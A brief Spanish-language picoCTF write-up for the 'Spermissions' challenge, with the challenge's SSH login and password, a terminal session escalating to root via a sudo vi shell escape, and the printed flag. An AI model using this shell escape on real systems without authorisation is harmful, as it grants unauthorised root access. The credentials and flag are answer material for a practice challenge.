# Spermissions
# Descripción del reto:
Can you read files in the root file? The system admin has provisioned an account for you on the main server: `ssh -p 55161 picoplayer@saturn.picoctf.net` Password: `yX-YQgX-vS` Can you login and read the root file?
# Solución:
ssh -p 59831 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:59831 ([13.59.203.175]:59831)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [saturn.picoctf.net]:55161
    ~/.ssh/known_hosts:12: [saturn.picoctf.net]:62821
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:59831' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Feb 21 01:57:56 2026 from 187.133.0.150
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh'
[sudo] password for picoplayer: 

# ls -la /root
total 16
drwx------ 1 root root   22 Feb 21 02:00 .
drwxr-xr-x 1 root root   63 Feb 21 01:56 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  532 Feb 21 02:00 .viminfo
# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_55878b51}
# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.

# Notas adicionales
# Referencias